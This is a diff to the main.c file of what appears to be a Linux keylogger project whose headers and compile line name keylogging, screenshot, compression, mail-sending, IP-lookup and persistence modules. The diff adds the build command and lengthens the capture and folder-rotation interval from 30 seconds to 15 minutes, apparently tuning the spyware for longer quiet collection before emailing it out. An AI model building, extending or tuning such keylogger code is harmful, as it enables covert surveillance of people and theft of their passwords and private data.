@@ -13,6 +13,8 @@
 #include "mailWorker.h"
 #include "persistent.h"
 
+// Compile with: gcc -o main main.c getKeyboard.c keylogger.c screenShot.c compress.c sendMail.c getIP.c mailWorker.c  -lpthread -lX11 -lcurl
+
 #define TEMPDIR "/tmp"
 
 volatile sig_atomic_t stopLogging = 0;
@@ -93,7 +95,7 @@ int main()
     while (1)
     {
         time_t now = time(NULL);
-        if (difftime(now, lastFolderTime) >= 30)
+        if (difftime(now, lastFolderTime) >= 15*60)
         {
             pthread_mutex_lock(&dirLock);
             free(KeyLogDir);
@@ -116,7 +118,7 @@ int main()
         }
 
         stopLogging = 0;
-        alarm(30);
+        alarm(15*60);
         keylogger(keyboard, writeout);
         alarm(0);
 
